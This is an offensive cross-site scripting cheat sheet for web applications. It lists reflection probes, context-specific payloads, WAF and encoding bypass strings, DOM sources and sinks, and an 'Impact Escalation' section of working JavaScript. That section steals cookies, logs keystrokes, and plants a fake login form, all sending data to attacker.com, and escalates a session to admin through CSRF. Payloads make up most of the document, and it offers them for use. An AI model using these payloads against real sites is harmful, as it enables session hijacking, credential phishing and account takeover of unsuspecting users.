# XSS Discovery and Exploitation

Cross-Site Scripting detection, bypass, and impact escalation.

## Phase 1: Identify Reflection Points
- URL parameters: `?param=CANARY123` — search response for CANARY123
- POST body fields: inject in every form field
- HTTP headers: Referer, User-Agent, X-Forwarded-For
- File upload names: `"><img src=x onerror=alert(1)>.png`
- JSON responses rendered in HTML
- Error messages that reflect input

## Phase 2: Determine Context
| Context | Test | Payload |
|---------|------|---------|
| HTML body | `<h1>test` | `<script>alert(1)</script>` |
| Attribute | `" onmouseover=` | `" autofocus onfocus=alert(1) x="` |
| JavaScript | `';alert(1)//` | `'-alert(1)-'` or `\';alert(1)//` |
| URL/href | `javascript:` | `javascript:alert(1)` |
| Template | `{{7*7}}` | `{{constructor.constructor('alert(1)')()}}` |
| CSS | `expression(` | `background:url(javascript:alert(1))` |

## Phase 3: WAF Bypass Payloads
```
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

## Encoding Bypasses
- Double URL encode: `%253Cscript%253E`
- HTML entities: `&#x3C;script&#x3E;`
- Unicode: `\u003cscript\u003e`
- Mixed case: `<ScRiPt>alert(1)</sCrIpT>`
- Null bytes: `<scri%00pt>alert(1)</script>`
- Tab/newline: `<img\tsrc=x\nonerror=alert(1)>`

## Phase 4: DOM XSS
Sources to check:
- `document.location`, `location.hash`, `location.search`
- `document.referrer`, `document.URL`
- `window.name`, `postMessage` handlers
- `localStorage`, `sessionStorage`

Sinks to find:
- `innerHTML`, `outerHTML`, `document.write`
- `eval()`, `setTimeout()`, `setInterval()`
- `Function()`, `$.html()`, `v-html`, `dangerouslySetInnerHTML`

Test: `https://target.com/page#<img src=x onerror=alert(1)>`

## Phase 5: Impact Escalation
```javascript
// Cookie theft
fetch('https://attacker.com/steal?c='+document.cookie)

// Session hijack
new Image().src='https://attacker.com/log?cookie='+document.cookie

// Keylogger
document.onkeypress=function(e){fetch('https://attacker.com/k?k='+e.key)}

// Phishing — inject fake login form
document.body.innerHTML='<h2>Session Expired</h2><form action="https://attacker.com/phish"><input name=user placeholder=Email><input name=pass type=password placeholder=Password><button>Login</button></form>'

// CSRF via XSS
fetch('/api/admin/users',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"role":"admin"}',credentials:'include'})
```

## Tips
- Reflected XSS: check EVERY parameter, not just obvious ones
- Stored XSS: test profile fields, comments, file names, metadata
- If `<` and `>` are filtered, focus on attribute injection
- `<svg>` and `<math>` tags bypass many sanitizers
- Use Burp Collaborator or webhook.site for blind XSS
- CSP bypass: look for `unsafe-inline`, `unsafe-eval`, or whitelisted CDN domains
- Chain XSS + CSRF for account takeover
